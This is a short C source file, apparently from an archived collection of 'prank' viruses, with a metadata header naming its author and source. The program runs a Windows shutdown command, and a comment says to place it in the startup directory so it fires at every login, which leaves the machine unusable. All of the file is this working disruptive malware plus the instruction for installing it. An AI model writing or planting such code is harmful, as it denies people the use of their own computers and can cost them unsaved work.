/*
  name      Dark Screen
  type      prank
  cve       —
  year      —
  os        windows
  authors   Minhas Kamal
  source    https://github.com/MinhasKamal/CuteVirusCollection
  archived  krisyotam
  notes     shuts system down immediately
 */

// Shuts the system down. Place in startup dir to trigger on login.
#include <stdlib.h>

main(){
    system("shutdown -s");
}
